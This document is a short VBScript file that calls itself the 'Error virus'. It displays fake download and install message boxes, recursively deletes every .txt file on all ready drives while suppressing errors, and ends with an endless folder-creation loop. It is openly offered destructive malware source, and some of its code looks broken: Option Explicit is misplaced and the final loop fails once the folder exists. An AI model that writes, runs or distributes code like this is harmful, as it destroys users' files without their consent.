Msgbox "Hi, this is Error virus."
Msgbox "Want to download me?"
Msgbox "Installing assets..."
Msgbox "Downloading code..."
Msgbox "Download completed."

Option Explicit

Dim fso, drive, folder, file, fileExtension
fileExtension = ".txt" ' Replace with the file extension to delete (e.g., ".tmp")

Set fso = CreateObject("Scripting.FileSystemObject")

' Loop through all drives on the system
For Each drive In fso.Drives
    If drive.IsReady Then ' Skip drives that are not ready (like empty CD/DVD drives)
        Set folder = fso.GetFolder(drive.Path)
        Call ProcessFolder(folder)
    End If
Next

' Subroutine to process files in folders and subfolders
Sub ProcessFolder(currentFolder)
    Dim subFolder
    For Each file In currentFolder.Files
        If LCase(fso.GetExtensionName(file.Name)) = LCase(Mid(fileExtension, 2)) Then
            On Error Resume Next
            file.Delete
            On Error GoTo 0
        End If
    Next
    For Each subFolder In currentFolder.SubFolders
        Call ProcessFolder(subFolder)
    Next
End Sub

Do
Set fso = CreateObject("Scripting.FileSystemObject")
fso.CreateFolder "C:\NewFolder"
loop